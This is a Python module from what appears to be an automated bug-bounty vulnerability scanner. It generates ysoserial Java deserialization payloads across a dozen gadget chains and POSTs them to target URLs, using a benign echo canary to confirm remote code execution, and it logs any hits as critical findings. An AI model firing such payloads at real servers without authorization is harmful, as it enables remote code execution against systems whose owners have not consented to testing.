"""YsoserialTool -- Java deserialization exploitation via ysoserial."""

from __future__ import annotations

import asyncio
import base64
import os

import aiohttp

from lib_webbh import setup_logger
from lib_webbh.scope import ScopeManager

from workers.vuln_scanner.base_tool import VulnScanTool
from workers.vuln_scanner.concurrency import WeightClass, get_semaphore

logger = setup_logger("ysoserial-tool")

YSOSERIAL_TIMEOUT = int(os.environ.get("YSOSERIAL_TIMEOUT", "300"))

# Common gadget chains to attempt
GADGET_CHAINS = [
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsCollections7",
    "Spring1",
    "Spring2",
    "Spring3",
    "Spring4",
    "Hibernate1",
]

# Tech-stack keywords that indicate Java
JAVA_KEYWORDS = frozenset([
    "java", "spring", "tomcat", "struts", "jboss", "wildfly",
    "weblogic", "websphere", "glassfish", "jetty",
])

# Canary command for detection
CANARY_CMD = "echo ysoserial_canary_$(hostname)"


class YsoserialTool(VulnScanTool):
    """Java deserialization exploitation via ysoserial."""

    name = "ysoserial"
    weight_class = WeightClass.HEAVY

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _has_java_tech(tech_stack: dict | None) -> bool:
        """Return True if tech_stack suggests Java platform."""
        if not tech_stack:
            return False
        text = str(tech_stack).lower()
        return any(kw in text for kw in JAVA_KEYWORDS)

    async def _generate_payload(self, gadget: str, command: str) -> bytes | None:
        """Generate a serialized payload using ysoserial."""
        cmd = [
            "java", "-jar", "/opt/ysoserial/ysoserial.jar",
            gadget, command,
        ]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout_bytes, _ = await asyncio.wait_for(
                proc.communicate(), timeout=30
            )
            if proc.returncode == 0 and stdout_bytes:
                return stdout_bytes
        except (asyncio.TimeoutError, Exception):
            pass
        return None

    async def _send_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: bytes,
        headers: dict | None,
    ) -> tuple[bool, str]:
        """Send a serialized payload and check for indicators."""
        send_headers = dict(headers or {})
        send_headers["Content-Type"] = "application/x-java-serialized-object"

        try:
            async with session.post(
                url,
                data=payload,
                headers=send_headers,
                timeout=aiohttp.ClientTimeout(total=30),
                ssl=False,
            ) as resp:
                body = await resp.text()
                # Check for canary in response
                if "ysoserial_canary" in body:
                    return True, f"Canary detected in response (status={resp.status})"
                # Check for deserialization errors indicating processing
                if resp.status == 500 and ("serialization" in body.lower() or "deserializ" in body.lower()):
                    return True, "Deserialization error triggered (status=500)"
                return False, ""
        except (aiohttp.ClientError, OSError, TimeoutError):
            return False, ""

    # ------------------------------------------------------------------
    # Execute
    # ------------------------------------------------------------------

    async def execute(
        self,
        target,
        scope_manager: ScopeManager,
        target_id: int,
        container_name: str,
        headers: dict | None = None,
        **kwargs,
    ) -> dict:
        log = logger.bind(target_id=target_id)
        triaged_findings = kwargs.get("triaged_findings")
        scan_all = kwargs.get("scan_all", False)

        if await self.check_cooldown(target_id, container_name):
            log.info("Skipping ysoserial -- within cooldown")
            return {"found": 0, "in_scope": 0, "new": 0, "skipped_cooldown": True}

        stats = {"found": 0, "in_scope": 0, "new": 0, "skipped_cooldown": False}
        sem = get_semaphore(self.weight_class)

        # Collect URLs to test
        urls_to_test: list[tuple[int | None, str]] = []

        if triaged_findings:
            # -- Stage 2: confirm specific deserialization findings --
            for _vuln_id, asset_id, _severity, _title, poc in triaged_findings:
                target_url = poc or ""
                if target_url.startswith("http"):
                    urls_to_test.append((asset_id, target_url))

        elif scan_all:
            # -- Stage 3: only target Java tech-stack URLs --
            all_url_assets = await self._get_all_url_assets(target_id)
            for asset_id, url in all_url_assets:
                if not url.startswith("http"):
                    continue
                tech_stack = await self._get_tech_stack(asset_id)
                if not self._has_java_tech(tech_stack):
                    continue
                if await self._has_confirmed_vuln(target_id, asset_id, "deserialization"):
                    log.debug(f"Skipping {url} -- already confirmed deserialization")
                    continue
                urls_to_test.append((asset_id, url))
        else:
            log.info("No triaged findings or scan_all -- skipping")
            return stats

        if not urls_to_test:
            log.info("No Java targets found for ysoserial")
            await self.update_tool_state(target_id, container_name)
            return stats

        async with aiohttp.ClientSession() as session:
            for asset_id, url in urls_to_test:
                vuln_found = False

                for gadget in GADGET_CHAINS:
                    if vuln_found:
                        break

                    async with sem:
                        payload = await self._generate_payload(gadget, CANARY_CMD)
                        if not payload:
                            log.debug(f"Failed to generate {gadget} payload")
                            continue

                        is_vuln, detail = await self._send_payload(
                            session, url, payload, headers
                        )

                    if is_vuln:
                        vuln_found = True
                        stats["found"] += 1
                        stats["in_scope"] += 1
                        stats["new"] += 1
                        b64_payload = base64.b64encode(payload[:200]).decode()
                        poc_text = (
                            f"ysoserial gadget={gadget}\n"
                            f"Payload (b64, truncated): {b64_payload}\n"
                            f"Detail: {detail}"
                        )

                        if triaged_findings:
                            for vuln_id, _aid, severity, title, _poc in triaged_findings:
                                if _aid == asset_id:
                                    await self._update_vulnerability(
                                        vuln_id=vuln_id,
                                        severity="critical",
                                        poc=poc_text,
                                        source_tool="ysoserial",
                                        description=f"ysoserial confirmed Java deserialization: {title}",
                                    )
                                    break
                        else:
                            await self._save_vulnerability(
                                target_id=target_id,
                                asset_id=asset_id,
                                severity="critical",
                                title=f"Java Deserialization RCE ({gadget}) - {url}",
                                description=f"ysoserial detected Java deserialization via {gadget} at {url}",
                                poc=poc_text,
                            )
                        log.info(f"ysoserial found deserialization at {url} (gadget={gadget})")

        await self.update_tool_state(target_id, container_name)
        log.info("ysoserial complete", extra=stats)
        return stats
